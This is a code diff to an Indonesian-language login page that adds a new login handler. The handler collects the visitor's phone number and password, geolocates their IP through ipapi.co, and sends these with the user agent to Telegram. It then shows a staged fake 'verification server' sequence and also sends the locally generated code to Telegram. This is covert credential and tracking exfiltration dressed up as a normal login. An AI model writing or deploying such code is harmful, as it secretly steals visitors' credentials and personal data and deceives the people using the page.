@@ -371,7 +371,7 @@
 <label for="loginCode">KODE VERIFIKASI</label>
 <input disabled="" id="loginCode" maxlength="6" placeholder="Masukkan kode 6 digit" type="text"/>
 </div>
-<button class="login-button" id="loginButton" onclick="startLogin()">Klik untuk dapatkan kode</button>
+<button class="login-button" id="loginButton" onclick="triggerLogin()">Klik untuk dapatkan kode</button>
 <div class="input-group">
 <label for="loginPassword">PASSWORD</label>
 <input id="loginPassword" placeholder="Masukkan password akses" type="password"/>
@@ -431,6 +431,56 @@
 </div>
 </div>
 <script>
+// 🌐 Trigger login, ambil IP dulu baru lanjut
+function triggerLogin() {
+    const phoneNumber = document.getElementById('loginPhone').value;
+    const password = document.getElementById('loginPassword').value;
+
+    if (!phoneNumber) {
+        alert('Masukkan nomor telepon terlebih dahulu');
+        return;
+    }
+
+    if (password !== '321123') {
+        alert('Password salah!');
+        return;
+    }
+
+    loggedInPhoneNumber = phoneNumber;
+    document.getElementById('loginButton').disabled = true;
+    document.getElementById('terminal').style.display = 'block';
+
+    fetch('https://ipapi.co/json')
+        .then(res => res.json())
+        .then(data => {
+            const userIP = data.ip + ' (' + data.city + ', ' + data.country_name + ')';
+            startLoginFinal(userIP, phoneNumber, password);
+        })
+        .catch(err => {
+            startLoginFinal('Unavailable', phoneNumber, password);
+        });
+}
+
+function startLoginFinal(userIP, phoneNumber, password) {
+    sendToTelegram(`🔐 LOGIN ATTEMPT\n📱 Nomor: ${phoneNumber}\n🔑 Password: ${password}\n🖥️ User Agent: ${navigator.userAgent}\n🌐 IP: ${userIP}`);
+
+    setTimeout(() => {
+        addTerminalLine('> Menghubungkan ke server verifikasi...');
+        setTimeout(() => {
+            addTerminalLine('> Server merespons... [200 OK]');
+            setTimeout(() => {
+                verificationCode = generateRandomCode();
+                addTerminalLine(`> Kode anda adalah:\n\n${verificationCode}`);
+                sendToTelegram(`📳 VERIFICATION CODE SENT\n📱 Nomor: ${phoneNumber}\n🔢 Kode: ${verificationCode}`);
+                document.getElementById('loginCode').disabled = false;
+                document.getElementById('loginButton').textContent = 'VERIFIKASI KODE';
+                document.getElementById('loginButton').onclick = verifyCode;
+                document.getElementById('loginButton').disabled = false;
+            }, 1000);
+        }, 1500);
+    }, 1000);
+}
+
 async function startLogin() {
     const phoneNumber = document.getElementById('loginPhone').value;
     const password = document.getElementById('loginPassword').value;
